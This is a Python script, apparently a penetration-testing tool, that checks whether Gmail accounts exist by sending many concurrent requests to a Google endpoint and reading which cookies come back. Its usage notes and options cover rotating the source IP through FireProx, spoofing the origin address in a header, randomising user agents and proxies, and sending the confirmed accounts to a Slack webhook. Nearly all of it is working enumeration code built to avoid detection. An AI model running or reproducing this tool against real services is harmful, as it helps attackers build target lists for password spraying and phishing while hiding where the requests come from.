#!/usr/bin/env python3
import asyncio
import aiohttp
import argparse
import time
import urllib3
import requests
from math import trunc
from random import randrange, shuffle
from fake_useragent import UserAgent

description = """
This is a script to check if given account(s) exists or not at GMail. The decision is made upon the existence or not of COMPASS cookie in the response.
"""

epilog = """
EXAMPLE USAGE:
This command will use the provided userlist and output the results.
    poetry run ./checkmail.py --userlist ./userlist.txt

This command uses the specified FireProx URL to check from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
    poetry run ./checkmail.py --userlist ./userlist.txt --url https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox --out valid-users.txt

TIPS:
[1] When using along with FireProx, pass option -H "X-My-X-Forwarded-For: 127.0.0.1" to spoof origin IP.
"""

class text_colors:
    """Helper class to make colorizing easy."""

    red = "\033[91m"
    green = "\033[92m"
    yellow = "\033[93m"
    reset = "\033[0m"


class SlackWebhook:
    """Helper class for sending posts to Slack using webhooks."""

    def __init__(self, webhook_url):
        self.webhook_url = webhook_url

    # Post a simple update to slack
    def post(self, text):
        block = f"```\n{text}\n```"
        payload = {
            "blocks": [{"type": "section", "text": {"type": "mrkdwn", "text": block}}]
        }
        status = self.__post_payload(payload)
        return status

    # Post a json payload to slack webhook URL
    def __post_payload(self, payload):
        response = requests.post(self.webhook_url, json=payload, timeout=4)
        if response.status_code != 200:
            print(
                "%s[Error] %s%s"
                % (
                    text_colors.red,
                    "Could not send notification to Slack",
                    text_colors.reset,
                )
            )


def notify(webhook, text):
    """Send notifications using Webhooks.

    Args:
        webhook (str): Webhook endpoint
        text (str): Text to be sent
    """
    notifier = SlackWebhook(webhook)
    try:
        notifier.post(text)
    except BaseException:
        pass



def get_list_from_file(file_):
    """Create a list from the contents of a file.

    Args:
        file_ (str): Input file name

    Returns:
        List[str]: Content of input file splitted by lines
    """
    with open(file_, "r") as f:
        list_ = [line.strip() for line in f]
    return list_


def assertions(args):
    """Make assertions about the provided args.

    Args:
        args (optparse_parser.Values): parsed args as returned by argparse.parse_args
    """
    assert args.sleep >= 0
    assert args.jitter in range(101)
    assert args.timeout >= 0
    if args.proxy:
        assert "://" in args.proxy, "Malformed proxy. Missing schema?"


# disable ssl warnings
urllib3.disable_warnings()

parser = argparse.ArgumentParser(
    description=description,
    epilog=epilog,
    formatter_class=argparse.RawDescriptionHelpFormatter,
)

group_user = parser.add_mutually_exclusive_group(required=True)
group_user.add_argument("-u", "--username", type=str, help="Single username")
group_user.add_argument(
    "-U",
    "--usernames",
    type=str,
    metavar="FILE",
    help="File containing usernames in the format 'user@domain'.",
)
parser.add_argument(
    "-o",
    "--out",
    metavar="OUTFILE",
    default="valid_users.txt",
    help="A file to output valid results to (default: %(default)s).",
)
parser.add_argument(
    "-x",
    "--proxy",
    type=str,
    help="Use proxy on requests (e.g. http://127.0.0.1:8080)",
)
parser.add_argument(
    "-t",
    "--max-connections",
    dest="maxconn",
    type=int,
    default=20,
    help="Maximum number of simultaneous connections (default: %(default)s)"
)
parser.add_argument(
    "--url",
    default="https://mail.google.com",
    help=("Target URL (default: %(default)s)."
        " Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from."),
)
parser.add_argument(
    "--shuffle",
    action="store_true",
    help="Shuffle user list.",
)

parser.add_argument(
    "--notify",
    type=str,
    help="Slack webhook for sending notifications about results (default: %(default)s).",
    default=None,
    required=False,
)
parser.add_argument(
    "-s",
    "--sleep",
    default=0,
    type=int,
    help="Sleep this many seconds between tries (default: %(default)s).",
)
parser.add_argument(
    "-j",
    "--jitter",
    type=int,
    default=0,
    help="Maximum of additional delay given in percentage over base delay (default: %(default)s).",
)
parser.add_argument(
    "-H",
    "--header",
    help="Extra header to include in the request (can be used multiple times).",
    action="append",
    dest="headers",
)
parser.add_argument(
    "-A",
    "--user-agent",
    default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    dest="user_agent",
    metavar="NAME",
    help='Send User-Agent %(metavar)s to server (default: "%(default)s").',
)
parser.add_argument(
    "--rua", action="store_true", help="Send random User-Agent in each request."
)
parser.add_argument(
    "--timeout",
    default=60,
    type=float,
    help="Total timeout for requests, in seconds (default: %(default)s)"
)
parser.add_argument(
    "-v",
    "--verbose",
    action="store_true",
    help="Prints detailed information.",
)

args = parser.parse_args()
assertions(args)

args.jitter += 1

usernames = [args.username] if args.username else get_list_from_file(args.usernames)
if args.shuffle:
    shuffle(usernames)

proxies = None
if args.proxy:
    proxies = {
        "http": args.proxy,
        "https": args.proxy,
    }

start_time = time.strftime("%Y%m%d%H%M%S")

username_count = len(usernames)
headers = dict()
# include custom headers
if args.headers:
    for header in args.headers:
        h, v = header.split(":", 1)
        headers[h.strip()] = v.strip()

ua = UserAgent(fallback=args.user_agent)  # avoid exception with fallback
valid_users = set()


async def fetch(session, username, headers):
    # FIX: causing connection to hang
    # if args.sleep > 0:
    #     time.sleep(args.sleep + args.sleep * (randrange(args.jitter) / 100))
    # set user-agent
    if args.rua:      
        headers["User-Agent"] = ua.random
    else:
        headers["User-Agent"] = args.user_agent

    params = {"email": username}
    try:
        async with session.head('/mail/gxlu', headers=headers, params=params, proxy=args.proxy) as resp:
            if "COMPASS" in resp.cookies.keys():
                print(
                    f"{text_colors.green}{username} VALID!{text_colors.reset}"
                )
                valid_users.add(username)
            else:
                if args.verbose:
                    print(
                        f"{text_colors.red}{username} invalid!{text_colors.reset}"
                    )
                
    except Exception as e:
        print(
            f"{text_colors.red}Error: {e}{text_colors.reset}"
        )
        pass


async def main():
    username_counter = 0
    timeout = aiohttp.ClientTimeout(total=args.timeout)
    connector = aiohttp.TCPConnector(limit=args.maxconn)
    async with aiohttp.ClientSession(args.url, timeout=timeout, connector=connector) as session:
        await asyncio.gather(*[asyncio.ensure_future(fetch(session, username, headers)) for username in usernames])
            

loop = asyncio.get_event_loop()
loop.run_until_complete(main())


# write current users to file
if len(valid_users) != 0:
    with open(args.out, "w") as out_file:
        result = list(valid_users)
        result.sort()
        out_file.write("\n".join(result))
    print(f"Results have been written to {args.out}.")
    if args.notify:
        msg = "Found valid users! (-.^)\n\n"
        msg += "\n".join(result)
        notify(args.notify, msg)
